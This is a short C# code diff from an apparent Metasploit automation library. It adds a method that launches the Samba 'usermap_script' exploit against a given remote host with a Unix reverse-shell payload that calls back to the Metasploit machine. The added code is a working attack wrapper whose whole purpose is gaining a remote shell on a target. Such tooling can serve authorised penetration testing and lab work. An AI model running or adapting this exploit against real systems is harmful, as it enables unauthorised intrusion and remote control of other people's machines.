@@ -113,5 +113,19 @@ namespace Lacey.Alexa.Common.Metasploit.Extensions
 
             return await metasploit.ExecuteModule(module);
         }
+
+        public static async Task<Dictionary<string, object>> UsermapScriptExec(
+            this IMetasploitProvider metasploit,
+            string rHost)
+        {
+            var module = new MetasploitModule(ModuleType.Exploit, ModuleNames.UsermapScript)
+                .RHost(rHost)
+                .LHost(metasploit.MetasploitAddress.ToString())
+                .LPort(DefaultPorts.LPort)
+                .Payload(PayloadNames.CmdUnixReverse)
+                .DisablePayloadHandler(true);
+
+            return await metasploit.ExecuteModule(module);
+        }
     }
 }
